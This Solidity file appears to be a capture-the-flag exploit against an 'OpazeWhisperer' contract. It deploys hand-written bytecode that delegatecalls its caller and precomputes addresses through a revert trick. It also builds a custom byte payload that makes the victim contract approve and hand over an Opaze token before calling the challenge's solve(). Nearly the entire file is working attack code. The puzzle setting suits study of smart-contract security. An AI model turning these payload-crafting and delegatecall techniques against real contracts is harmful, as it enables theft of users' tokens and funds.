// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "src/Challenge.sol";

import "src/OpazeWhisperer.sol";
import "src/Opaze.sol";

contract Exploit {
    Challenge private immutable CHALLENGE;
    address private immutable ADDRESS_THIS;
    OpazeWhisperer private immutable OPAZEWHISPERER;
    Opaze private immutable OPAZE;

    constructor(Challenge challenge) {
        CHALLENGE      = challenge;
        OPAZEWHISPERER = challenge.OPAZEWHISPERER();
        OPAZE          = challenge.OPAZE();
        ADDRESS_THIS   = address(this); 
    }

    function exploit() external payable{
        (, bytes memory o) = address(this).call(abi.encodeWithSignature("_deployCaller()"));
        address c = abi.decode(o, (address));
        payable(c).transfer(1 ether);
        
        c = new Deployer().deployCaller();

        c.call("");

        OPAZE.transferFrom(address(OPAZEWHISPERER), CHALLENGE.PLAYER(), 1);

        CHALLENGE.solve();
    }

    function _deployCaller() public returns (address o) {
        o = new Deployer().deployCaller();
        assembly{
            mstore(0, o)
            revert(0, 0x20)
        }
    }
    function getBytes(bytes memory data, uint256 start, uint256 length) internal pure returns (bytes memory) {
        bytes memory result = new bytes(length);
        assembly {
            // Copy length bytes starting from start
            for { let i := 0 } lt(i, length) { i := add(i, 1) } {
                mstore8(
                    add(add(result, 32), i),
                    byte(0, mload(add(add(data, 32), add(start, i))))
                )
            }
        }
        return result;
    }

    fallback() external payable {

        bytes memory push_stack = hex"11";
        bytes memory call = hex"22";
        bytes memory push_memory = hex"33";

        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", ADDRESS_THIS, 1);
        
        ///*/// craft the payload ///*/// 
        bytes memory payload = hex"";
        payload = bytes.concat(payload, abi.encodeWithSignature("play(string)", "answer"));

        // bytesToRead
        payload = bytes.concat(payload, push_stack);
        payload = bytes.concat(payload, hex"01");
        payload = bytes.concat(payload, hex"44"); // 4 selector + 2 * 32 variable
        
        // memPos
        payload = bytes.concat(payload, push_stack);
        payload = bytes.concat(payload, hex"01");
        payload = bytes.concat(payload, hex"00");

        // value
        payload = bytes.concat(payload, push_stack);
        payload = bytes.concat(payload, hex"01");
        payload = bytes.concat(payload, hex"00");

        // target
        payload = bytes.concat(payload, push_stack);
        payload = bytes.concat(payload, hex"14");
        payload = bytes.concat(payload, bytes20(address(OPAZE)));

        // encode the approve call
        payload = bytes.concat(payload, push_memory);
        payload = abi.encodePacked(payload, getBytes(data, 0, 32));
        payload = bytes.concat(payload, push_memory);
        payload = abi.encodePacked(payload, getBytes(data, 32, 32));
        payload = bytes.concat(payload, push_memory);
        payload = abi.encodePacked(payload, getBytes(data, 64, 32));

        payload = bytes.concat(payload, call);

        address(OPAZEWHISPERER).call{value : 721 wei}(payload);
    }
}

contract Deployer{
    function deployCaller() public returns(address){
        bytes memory x = hex"5f5f5f5f335af400";
        x = bytes.concat(x, hex"0660"); // dest offset jump in metadata
        return address(new OurBytecode(x));
    }
}
contract OurBytecode{
    constructor(bytes memory code){assembly{return (add(code, 0x20), mload(code))}}
}
